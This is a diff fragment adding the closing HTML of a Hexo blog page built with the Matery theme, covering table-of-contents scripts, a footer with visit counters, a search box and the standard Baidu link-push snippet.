+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="../../../../libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('1'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2015</span>
+            <a href="../../../../about" target="_blank">xyzz</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">45.8k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="../../../../js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("../../../../search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="../../../../libs/materialize/materialize.min.js"></script>
+    <script src="../../../../libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="../../../../libs/aos/aos.js"></script>
+    <script src="../../../../libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="../../../../libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="../../../../js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="../../../../libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="../../../../libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="../../../../libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
